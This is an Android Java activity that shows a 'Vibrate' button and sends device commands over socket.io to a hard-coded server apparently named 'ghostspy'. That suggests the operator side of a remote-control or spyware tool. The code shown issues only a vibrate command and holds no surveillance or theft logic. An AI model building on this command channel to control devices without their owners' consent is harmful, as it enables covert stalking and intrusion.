package com.testapp;

import android.app.Activity;
import android.os.Bundle;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.Toast;
import io.socket.client.IO;
import io.socket.client.Socket;
import org.json.JSONObject;
import java.net.URISyntaxException;

public class ControlActivity extends Activity {
    private Socket socket;
    private String deviceId;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        deviceId = getIntent().getStringExtra("deviceId");

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setBackgroundColor(0xFF0B0E17);
        layout.setPadding(32, 32, 32, 32);

        Button btnVibrate = new Button(this);
        btnVibrate.setText("📳 Vibrate");
        btnVibrate.setOnClickListener(v -> sendCmd("vibrate"));
        layout.addView(btnVibrate);

        setContentView(layout);

        try {
            socket = IO.socket("https://ghostspy.bruang.biz.id");
            socket.connect();
        } catch (URISyntaxException e) {
            Toast.makeText(this, "Socket error", Toast.LENGTH_SHORT).show();
        }
    }

    private void sendCmd(String cmd) {
        if (socket != null && socket.connected()) {
            JSONObject msg = new JSONObject();
            try {
                msg.put("device_id", deviceId);
                msg.put("command", cmd);
                msg.put("params", new JSONObject());
                socket.emit("command", msg);
                Toast.makeText(this, "✅ " + cmd, Toast.LENGTH_SHORT).show();
            } catch (Exception e) {}
        } else {
            Toast.makeText(this, "❌ Offline", Toast.LENGTH_SHORT).show();
        }
    }
}
